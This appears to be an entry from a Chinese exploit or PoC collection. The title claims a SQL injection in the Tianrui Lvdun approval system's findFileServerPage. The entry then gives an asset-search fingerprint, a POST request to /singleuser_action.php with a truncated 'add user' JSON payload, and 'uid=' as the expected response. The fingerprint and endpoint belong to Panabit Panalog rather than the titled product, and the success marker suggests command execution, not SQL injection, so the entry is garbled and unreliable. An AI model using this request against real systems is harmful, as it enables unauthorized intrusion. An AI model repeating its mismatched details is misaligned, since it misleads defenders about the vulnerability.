# 天锐绿盾审批系统findFileServerPage存在SQL注入漏洞

- **系统**：天锐绿盾　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="Panabit-Panalog"`
- **请求**：`POST /singleuser_action.php HTTP/1.1`

**请求体 / payload**
```
**添加用户**
Host:
Content-Length: 576
Content-Type: application/x-www-form-urlencoded
{ "syncInfo": { "user": { "userId": "119", "userName": "119", "employeeId": "119", "departmentId": "119", "departmentName": "119", "coporationId": "119", "corporationName": "119", "userSex": "1", "userDuty": "119", "userBirthday": "119", "userPost": "119", "userPostCode": "119", "userAlias": "119", "userRank": "119", "userPhone": "119", "userHomeAddress": "119", "userMobilePhone": "119", "userMailAddress": "119", "userMSN": "119", "userNt": "119", "userCA": "119", "userPwd": "119", "userClass": "119", "parentId"…（脚本共 1146 字，完整版见原文）
```
- **预期**：200　|　uid=